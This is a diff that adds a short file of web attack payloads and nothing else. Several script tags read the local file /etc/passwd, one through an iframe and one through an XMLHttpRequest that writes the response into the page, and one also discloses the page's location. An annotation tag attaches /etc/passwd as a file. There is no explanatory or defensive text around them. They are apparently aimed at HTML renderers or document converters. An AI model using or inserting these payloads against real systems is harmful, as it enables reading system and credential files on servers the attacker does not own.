@@ -1,0 +1,15 @@
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
+
+
+
+<script>
+    // Path Disclosure
+    document.write(window.location);
+    // Arbitrary Local File Read
+    xhr = new XMLHttpRequest;
+    xhr.onload=function(){document.write((this.responseText))};
+    xhr.open("GET","file:///etc/passwd");
+    xhr.send();
+</script>
+
+<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
